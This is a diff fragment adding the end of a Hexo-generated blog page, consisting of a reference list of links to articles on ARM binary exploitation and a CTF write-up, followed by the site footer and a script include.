+<p><a target="_blank" rel="noopener" href="https://a1ex.online/2020/12/29/Arm%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2020/12/29/Arm%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/118365722">https://blog.csdn.net/qq_41202237/article/details/118365722</a></p>
+<p><a target="_blank" rel="noopener" href="https://changochen.github.io/2018-02-04-codegate.html">https://changochen.github.io/2018-02-04-codegate.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://x1ng.top/2020/11/16/arm-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF/">https://x1ng.top/2020/11/16/arm-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/">https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/</a></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Q^Q
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;desk9t
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
